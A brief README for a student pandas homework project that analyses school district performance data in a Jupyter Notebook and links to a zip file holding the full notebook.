# pandas-challenge
Module 4 homework with pandas

Using Pandas and Jupyter Notebook in this module Python is used to showcase student performance in a school district. Calculations completed included overall students passing math and reading, school name, school type, total students, total budget, and other perameters as well. Please see the the https://raw.githubusercontent.com/purribd8/pandas-challenge/main/PyCitySchools/Resources/pandas-challenge-v3.4.zip located in the PyCitySchools folder for the full notebook.
